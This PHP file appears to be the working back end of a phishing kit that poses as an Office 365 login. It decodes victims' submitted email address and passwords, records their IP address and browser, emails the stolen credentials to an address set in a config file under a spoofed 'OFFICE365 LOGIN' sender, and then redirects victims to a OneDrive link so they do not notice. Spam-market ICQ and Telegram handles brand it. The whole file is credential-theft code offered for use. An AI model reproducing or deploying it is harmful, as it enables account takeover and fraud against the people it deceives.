<?php
error_reporting();
require_once 'config/config.php';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if (!isset($_GET['auth'])) {
  header("location: https://login.live.com");
} else {
  $usr = base64_decode($_GET['token']);
  $pw = base64_decode($_GET['auth']);
  $pw1 = base64_decode($_GET['auth1']);
  require_once 'config/config.php';
  $res = "################[ICQ :@MarketSpam | telegram :@MarketSpam]################\r\n";
  $res .= "##\r\n";
  $res .= "## Email/usr : $usr \r\n";
  $res .= "## Password  : $pw \r\n";
  $res .= "## Password  : $pw1 \r\n";
  $res .= "##\r\n";
  $res .= "##################[IP ADDRESS ]##################\r\n";
  $res .= "##";
  $res .= "## IP Address : $ip\r\n";
  $res .= "## UserAgent : $ua \r\n";
  $res .= "##\r\n";
  $res .= "################[AdMun]################\r\n";
  $headers = "From: OFFICE365 LOGIN <marketSpam@icq.im>";
		$subject = "💟 ".strtoupper($_GET['token'])." // $ip";
		$to = $config['result'];
		mail($to, $subject, $res, $headers);
}
sleep(2);
header("location: https://1drv.ms/w/s!AjblQDMgv2m_g0xqUY7R02CgHYbi?e=fHjdOe");